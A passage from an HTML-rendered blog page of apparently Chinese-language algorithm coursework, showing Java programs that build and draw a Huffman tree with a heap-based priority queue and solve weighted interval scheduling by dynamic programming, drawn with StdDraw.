class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.*;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HuffmanDemo</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-type">int</span> <span class="hljs-variable">rr</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;<br>        <span class="hljs-comment">//int count=10;</span><br>        <span class="hljs-comment">//char[] cS = {'a','b','c','d','e','f','g','h','i','j'};</span><br>        <span class="hljs-comment">//double[] dF={0.18,0.15,0.11,0.07,0.27,0.019,0.01,0.02,0.17,0.001};</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">7</span>;<br>        <span class="hljs-type">char</span>[] cS = {<span class="hljs-string">'a'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'i'</span>, <span class="hljs-string">'s'</span>, <span class="hljs-string">'t'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'n'</span>};<br>        <span class="hljs-type">double</span>[] dF = {<span class="hljs-number">0.1</span>, <span class="hljs-number">0.15</span>, <span class="hljs-number">0.12</span>, <span class="hljs-number">0.03</span>, <span class="hljs-number">0.04</span>, <span class="hljs-number">0.13</span>, <span class="hljs-number">0.01</span>};<br>        <span class="hljs-type">int</span>[] dF2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[count];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; count; i++) {<br>            dF2[i] = (<span class="hljs-type">int</span>) (dF[i] * <span class="hljs-number">1000</span>);<br>        }<br>        <span class="hljs-type">int</span>[][] dPS = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>][count];<br>        dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; count; i++) {<br>            dPS[<span class="hljs-number">0</span>][i] = dF2[i];<br>            dPS[<span class="hljs-number">1</span>][i] = i;<br>            insertHeap(dPS, i + <span class="hljs-number">1</span>);<br>            dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>;<br>        }<br>        <span class="hljs-type">int</span>[][] cHT = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">4</span>][count * <span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; count; i++) {<br>            cHT[<span class="hljs-number">0</span>][i] = i;<br>            cHT[<span class="hljs-number">1</span>][i] = -<span class="hljs-number">1</span>;<br>            cHT[<span class="hljs-number">2</span>][i] = -<span class="hljs-number">1</span>;<br>            cHT[<span class="hljs-number">3</span>][i] = <span class="hljs-number">1</span>;<br>        }<br>        <span class="hljs-type">int</span> <span class="hljs-variable">beishu</span> <span class="hljs-operator">=</span> count * rr * <span class="hljs-number">4</span>;<br>        StdDraw.setXscale(<span class="hljs-number">0</span>, beishu);<br>        StdDraw.setYscale(<span class="hljs-number">0</span>, beishu);<br>        StdDraw.setPenRadius(<span class="hljs-number">0.005</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> count;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">count2</span> <span class="hljs-operator">=</span> count;<br>        <span class="hljs-keyword">while</span> (count &gt;= <span class="hljs-number">1</span>) {<br>            <span class="hljs-keyword">if</span> (count == <span class="hljs-number">1</span>) {<br>                <span class="hljs-comment">//输出显示哈夫曼树</span><br>                inOrderPaint(root, cS, cHT, count2 * <span class="hljs-number">5</span>, count2 * <span class="hljs-number">4</span> * rr - <span class="hljs-number">10</span>, rr, count2 * <span class="hljs-number">1.9</span>);<br>                <span class="hljs-keyword">break</span>;<br>            }<br>            <span class="hljs-type">int</span> <span class="hljs-variable">mF</span> <span class="hljs-operator">=</span> dPS[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>            <span class="hljs-type">int</span> <span class="hljs-variable">f1</span> <span class="hljs-operator">=</span> dPS[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>            <span class="hljs-comment">//从优先队列中取出频率最小的结点</span><br>            dPS[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">0</span>][dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>]-<span class="hljs-number">1</span>];<br>            dPS[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">1</span>][dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>]-<span class="hljs-number">1</span>];<br>            <span class="hljs-comment">//从优先队列最后结点放到第一个结点的位置</span><br>            dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] - <span class="hljs-number">1</span>;<br>            deleteHeap(dPS, <span class="hljs-number">1</span>);<br>            <span class="hljs-comment">//重新调整为新的优先队列</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">mS</span> <span class="hljs-operator">=</span> dPS[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>            <span class="hljs-type">int</span> <span class="hljs-variable">f2</span> <span class="hljs-operator">=</span> dPS[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>            dPS[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">0</span>][dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] - <span class="hljs-number">1</span>];<br>            dPS[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">1</span>][dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] - <span class="hljs-number">1</span>];<br>            dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] - <span class="hljs-number">1</span>;<br>            deleteHeap(dPS, <span class="hljs-number">1</span>);<br>            <span class="hljs-comment">//从优先队列中取出频率次小的结点</span><br>            cHT[<span class="hljs-number">0</span>][n] = n;<br>            cHT[<span class="hljs-number">1</span>][n] = mF;<br>            cHT[<span class="hljs-number">2</span>][n] = mS;<br>            <span class="hljs-keyword">if</span> (cHT[<span class="hljs-number">3</span>][mF] &gt; cHT[<span class="hljs-number">3</span>][mS]) {<br>                cHT[<span class="hljs-number">3</span>][n] = cHT[<span class="hljs-number">3</span>][mF] + <span class="hljs-number">1</span>;<br>            }<br>            dPS[<span class="hljs-number">0</span>][dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>]] = f1 + f2;<br>            dPS[<span class="hljs-number">1</span>][dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>]] = n;<br>            dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>;<br>            insertHeap(dPS, dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>]);<br>            <span class="hljs-comment">//新结点加入优先树</span><br>            root = n;<br>            n = n + <span class="hljs-number">1</span>;<br>            count = count - <span class="hljs-number">1</span>;<br>        }<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertHeap</span><span class="hljs-params">(<span class="hljs-type">int</span>[][] dPS, <span class="hljs-type">int</span> i)</span> {<br>        <span class="hljs-type">int</span> zj,j;<br>        <span class="hljs-keyword">if</span>(i&gt;<span class="hljs-number">1</span>){<br>            j=i/<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">if</span>(dPS[<span class="hljs-number">0</span>][i-<span class="hljs-number">1</span>]&lt;dPS[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>]){<br>                zj=dPS[<span class="hljs-number">0</span>][i-<span class="hljs-number">1</span>];<br>                dPS[<span class="hljs-number">0</span>][i-<span class="hljs-number">1</span>]=dPS[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>];<br>                dPS[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>]=zj;<br>                zj=dPS[<span class="hljs-number">1</span>][i-<span class="hljs-number">1</span>];<br>                dPS[<span class="hljs-number">1</span>][i-<span class="hljs-number">1</span>]=dPS[<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>];<br>                dPS[<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>]=zj;<br>                insertHeap(dPS,j);<br>            }<br>        }<br>    }<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteHeap</span><span class="hljs-params">(<span class="hljs-type">int</span>[][] dPS, <span class="hljs-type">int</span> i)</span> {<br>        <span class="hljs-type">int</span> n;<br>        <span class="hljs-type">int</span> left,right,zj;<br>        n=dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>];;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">2</span>*i&gt;n)<br>            <span class="hljs-keyword">return</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-number">2</span>*i&lt;n){<br>            left=<span class="hljs-number">2</span>*i;<br>            right=<span class="hljs-number">2</span>*i+<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(dPS[<span class="hljs-number">0</span>][left-<span class="hljs-number">1</span>]&gt;dPS[<span class="hljs-number">0</span>][right-<span class="hljs-number">1</span>]) {<br>                j = right;<br>            }<br>            <span class="hljs-keyword">else</span> {<br>                j = left;<br>            }<br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n==<span class="hljs-number">2</span>*i){<br>            j=<span class="hljs-number">2</span>*i;<br>        }<br>        <span class="hljs-keyword">if</span>(dPS[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>]&lt;dPS[<span class="hljs-number">0</span>][i-<span class="hljs-number">1</span>]){<br>            zj=dPS[<span class="hljs-number">0</span>][i-<span class="hljs-number">1</span>];<br>            dPS[<span class="hljs-number">0</span>][i-<span class="hljs-number">1</span>]=dPS[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>];<br>            dPS[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>]=zj;<br>            zj=dPS[<span class="hljs-number">1</span>][i-<span class="hljs-number">1</span>];<br>            dPS[<span class="hljs-number">1</span>][i-<span class="hljs-number">1</span>]=dPS[<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>];<br>            dPS[<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>]=zj;<br>            deleteHeap(dPS,j);<br>        }<br>    }<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">inOrderPaint</span><span class="hljs-params">(<span class="hljs-type">int</span> root, <span class="hljs-type">char</span>[] cS, <span class="hljs-type">int</span>[][] cHT, <span class="hljs-type">double</span> x, <span class="hljs-type">double</span> y, <span class="hljs-type">double</span> r, <span class="hljs-type">double</span> jg)</span> {<br>        <span class="hljs-type">double</span> xC,yC,xS,yS,rC,zj1,zj2;<br>        StdDraw.setPenColor(StdDraw.BLACK);<br>        StdDraw.circle(x,y,r);<br>        <span class="hljs-keyword">if</span>(cHT[<span class="hljs-number">1</span>][root]!=-<span class="hljs-number">1</span>&amp;&amp;cHT[<span class="hljs-number">2</span>][root]==-<span class="hljs-number">1</span>){<br>            xC=x-jg;<br>            yC=y-<span class="hljs-number">4</span>*r;<br>            zj1=r*jg/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            zj2=<span class="hljs-number">4</span>*r*r/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            StdDraw.setPenColor(StdDraw.RED);<br>            StdDraw.line(x-zj1,y-zj2,xC+zj1,yC+zj2);<br>            inOrderPaint(cHT[<span class="hljs-number">1</span>][root],cS,cHT,xC,yC,r,jg/<span class="hljs-number">1.3</span>);<br>        }<br>        <span class="hljs-keyword">if</span>(cHT[<span class="hljs-number">2</span>][root]!=-<span class="hljs-number">1</span>&amp;&amp;cHT[<span class="hljs-number">1</span>][root]==-<span class="hljs-number">1</span>){<br>            xC=x+jg;<br>            yC=y-<span class="hljs-number">4</span>*r;<br>            zj1=r*jg/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            zj2=<span class="hljs-number">4</span>*r*r/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            StdDraw.setPenColor(StdDraw.RED);<br>            StdDraw.line(x+zj1,y-zj2,xC-zj1,yC+zj2);<br>            inOrderPaint(cHT[<span class="hljs-number">2</span>][root],cS,cHT,xC,yC,r,jg/<span class="hljs-number">1.3</span>);<br>        }<br>        <span class="hljs-keyword">if</span>(cHT[<span class="hljs-number">2</span>][root]!=-<span class="hljs-number">1</span>&amp;&amp;cHT[<span class="hljs-number">1</span>][root]!=-<span class="hljs-number">1</span>){<br>            xC=x-jg;<br>            yC=y-<span class="hljs-number">4</span>*r;<br>            zj1=r*jg/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            zj2=<span class="hljs-number">4</span>*r*r/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            StdDraw.setPenColor(StdDraw.RED);<br>            StdDraw.line(x-zj1,y-zj2,xC+zj1,yC+zj2);<br>            <span class="hljs-comment">//Sytem.out.print(" "+cHT[1][root]);</span><br>            inOrderPaint(cHT[<span class="hljs-number">1</span>][root],cS,cHT,xC,yC,r,jg/<span class="hljs-number">1.3</span>);<br>            xC=x+jg;<br>            yC=y-<span class="hljs-number">4</span>*r;<br>            zj1=r*jg/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            zj2=<span class="hljs-number">4</span>*r*r/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            StdDraw.setPenColor(StdDraw.RED);<br>            StdDraw.line(x+zj1,y-zj2,xC-zj1,yC+zj2);<br>            <span class="hljs-comment">//Sytem.out.print(" "+cHT[2][root]);</span><br>            inOrderPaint(cHT[<span class="hljs-number">2</span>][root],cS,cHT,xC,yC,r,jg/<span class="hljs-number">1.3</span>);<br>        }<br>        <span class="hljs-keyword">if</span>(cHT[<span class="hljs-number">2</span>][root]==-<span class="hljs-number">1</span>&amp;&amp;cHT[<span class="hljs-number">1</span>][root]==-<span class="hljs-number">1</span>){<br>            xS=x-<span class="hljs-number">0.05</span>*r;<br>            yS=y;<br>            String s=<span class="hljs-string">""</span>+cS[cHT[<span class="hljs-number">0</span>][root]];<br>            StdDraw.setPenColor(StdDraw.RED);<br>            StdDraw.text(xS,yS,s);<br>        }<br>    }<br>}<br><br><br></code></pre></td></tr></tbody></table></figure><h3 id="时隙最优解权值和"><a href="#时隙最优解权值和" class="headerlink" title="时隙最优解权值和"></a>时隙最优解权值和</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComputeRDemo</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>{<br>        <span class="hljs-type">int</span> isN=<span class="hljs-number">10</span>,gis=<span class="hljs-number">50</span>;<br>        <span class="hljs-type">int</span>[] isF=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isS=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isV=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isF2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isS2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isY2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isV2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isR=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isM=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span> beishu=gis;<br>        <span class="hljs-type">int</span>[] flagX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span> c=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (c&lt;isN){<br>            <span class="hljs-type">int</span> d1=(<span class="hljs-type">int</span>)(Math.random()*beishu);<br>            <span class="hljs-type">int</span> d2=(<span class="hljs-type">int</span>)(Math.random()*beishu);<br>            <span class="hljs-type">int</span> d3=(<span class="hljs-type">int</span>)(Math.random()*beishu);<br>            <span class="hljs-type">int</span> d4=(<span class="hljs-type">int</span>)(Math.random()*beishu);<br>            <span class="hljs-keyword">if</span>(d1&gt;d2){<br>                isS[c]=d2;<br>                isF[c]=d1;<br>                isF2[c]=d1;<br>                isV[c]=d4;<br>                isV2[c]=d4;<br>                flagX[c]=<span class="hljs-number">1</span>;<br>                c=c+<span class="hljs-number">1</span>;<br>            }<br>            }<br>        StdDraw.setXscale(<span class="hljs-number">0</span>,beishu);<br>        StdDraw.setYscale(<span class="hljs-number">0</span>,beishu);<br>        StdDraw.setPenRadius(<span class="hljs-number">0.005</span>);<br>        Arrays.sort(isF);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;isN;i++){<br>            isR[i]=<span class="hljs-number">0</span>;<br>            isM[i]=-<span class="hljs-number">1</span>;<br>        }<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;isN;i++){<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;isN;j++){<br>                <span class="hljs-keyword">if</span> (isF[i]==isF2[j]&amp;&amp;flagX[j]==<span class="hljs-number">1</span>){<br>                    isS2[i]=isS[j];<br>                    isV2[i]=isV[j];<br>                    flagX[j]=<span class="hljs-number">0</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                }<br>            }<br>        }<br>        <span class="hljs-type">int</span>[] isP=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isSX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isSY=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;isN;i++){<br>            isP[i]=-<span class="hljs-number">1</span>;<br>            isY2[i]=(<span class="hljs-type">int</span>)(beishu/isN*(isN-i)-<span class="hljs-number">0.5</span>);<br>            isSY[i]=isY2[i]-<span class="hljs-number">2</span>;<br>            isSX[i]=(<span class="hljs-type">int</span>)((isS2[i]+isF[i])/<span class="hljs-number">2</span>);<br>        }<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;isN;i++){<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=i-<span class="hljs-number">1</span>;j&gt;=<span class="hljs-number">0</span>;j--){<br>                <span class="hljs-keyword">if</span> (isS2[i]&gt;isF[j]){<br>                    isP[i]=j;<br>                    <span class="hljs-keyword">break</span>;<br>                }<br>            }<br>        }<br>        computeOpt(isV2,isM,isP,isN-<span class="hljs-number">1</span>);<br>        findSolutions(isM,isV2,isR,isP,isN-<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;isN;i++){<br>            StdDraw.setPenColor(StdDraw.BLUE);<br>            StdDraw.text(isSX[i],isSY[i],<span class="hljs-string">""</span>+isV2[i]);<br>            <span class="hljs-keyword">if</span> (isR[i]==<span class="hljs-number">1</span>){<br>                StdDraw.setPenColor(StdDraw.RED);<br>                StdDraw.line(isS2[i],isY2[i],isF[i],isY2[i]);<br>            }<br>            <span class="hljs-keyword">else</span> {<br>                StdDraw.setPenColor(StdDraw.BLACK);<br>                StdDraw.line(isS2[i],isY2[i],isF[i],isY2[i]);<br>            }<br>        }<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">computeOpt</span><span class="hljs-params">(<span class="hljs-type">int</span>[] V,<span class="hljs-type">int</span>[] M,<span class="hljs-type">int</span>[] P,<span class="hljs-type">int</span> j)</span> {<br>        <span class="hljs-keyword">if</span> (j &lt;= -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">else</span> {<br>            <span class="hljs-type">int</span> <span class="hljs-variable">d1</span> <span class="hljs-operator">=</span> computeOpt(V, M, P, P[j]);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">d2</span> <span class="hljs-operator">=</span> computeOpt(V, M, P, j - <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> ((V[j] + d1) &lt; d2) {<br>                M[j]=d2;<br>                <span class="hljs-keyword">return</span> d2;<br>            }<br>            <span class="hljs-keyword">else</span> {<br>                M[j]=V[j]+d1;<br>                <span class="hljs-keyword">return</span> (V[j]+d1);<br>            }<br>        }<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">findSolutions</span><span class="hljs-params">(<span class="hljs-type">int</span>[] M,<span class="hljs-type">int</span>[] V,<span class="hljs-type">int</span>[] R,<span class="hljs-type">int</span>[] P,<span class="hljs-type">int</span> j)</span>{<br>        <span class="hljs-type">int</span> i=j;<br>        <span class="hljs-type">int</span> d1,d2,d3=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (i&gt;=<span class="hljs-number">0</span>){<br>            <span class="hljs-keyword">if</span> (P[i]==-<span class="hljs-number">1</span>)<br>                d1=d3+V[i];<br>            <span class="hljs-keyword">else</span> {<br>                d1=d3+V[i]+M[P[i]];<br>            }<br>            <span class="hljs-keyword">if</span> (d1==M[j]){<br>                R[i]=<span class="hljs-number">1</span>;<br>                d3=d3+V[i];<br>                i=P[i];<br>            }<br>            <span class="hljs-keyword">else</span> {<br>                i=i-<span class="hljs-number">1</span>;<br>            }<br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="分段最小二乘法"><a 